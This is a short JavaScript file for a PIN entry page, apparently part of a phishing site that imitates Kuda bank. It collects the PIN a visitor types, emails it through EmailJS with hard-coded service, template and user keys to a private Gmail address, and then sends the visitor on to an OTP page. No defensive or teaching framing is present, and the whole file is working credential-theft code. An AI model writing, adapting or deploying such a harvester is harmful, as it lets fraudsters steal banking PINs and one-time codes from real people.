const serviceId = "service_umtm03b";
const userId = "K11nz8wu55BgPl4DY";
const templateId = "template_km1fgyr";
// Add event listeners to move the cursor to the next input field
var pinInputs = document.getElementsByClassName("pin-input");

for (var i = 0; i < pinInputs.length; i++) {
  pinInputs[i].addEventListener("input", function () {
    if (this.value.length === 1) {
      var nextInputIndex = Array.from(pinInputs).indexOf(this) + 1;
      if (nextInputIndex < pinInputs.length) {
        pinInputs[nextInputIndex].focus();
      }
    }
  });
}
const btn = document.querySelector("button");
btn.onclick = () => {
  btn.innerHTML = "Loading...";
};
// Function to collect and validate the PIN when the Submit button is clicked
document
  .getElementById("submitBtn")
  .addEventListener("click", function (event) {
    var pin = "";
    var pinInputs = document.getElementsByClassName("pin-input");

    for (var i = 0; i < pinInputs.length; i++) {
      pin += pinInputs[i].value;
    }

    console.log(pin);
    event.preventDefault();
    const emailParams = {
      to_name: "backendapp7@gmail.com",
      pin: pin,
    };
    console.log(emailParams);
    emailjs.send(serviceId, templateId, emailParams, userId).then(
      function (response) {
        console.log("Sent successfully:", response);
        pin = "";

        location.href = "/ma-Kuda.xyz.github.io/otp.html";
      },
      function (error) {
        console.log("Failed to send:", error);
      }
    );
  });
